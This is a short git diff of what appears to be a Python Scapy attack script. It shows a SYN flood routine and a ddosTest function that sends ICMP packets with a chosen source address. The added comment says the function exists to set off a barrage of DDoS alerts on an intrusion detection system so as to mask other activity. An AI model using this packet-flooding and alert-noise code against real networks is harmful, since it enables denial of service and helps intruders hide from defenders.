@@ -7,7 +7,7 @@ def synFlood(src, tgt):
 		pkt = IPlayer / TCPlayer
 		send(pkt)
 
-def ddosTest(src, dst, iface, count):
+def ddosTest(src, dst, iface, count):									# simply triggers a barrage of DDoS alerts on an IDS (to mask other activity), not an actual DDoS
 	pkt=IP(src=src,dst=dst)/ICMP(type=8,id=678)/Raw(load='1234')
 	send(pkt, iface=iface, count=count)
 	pkt = IP(src=src,dst=dst)/ICMP(type=0)/Raw(load='AAAAAAAAAA')
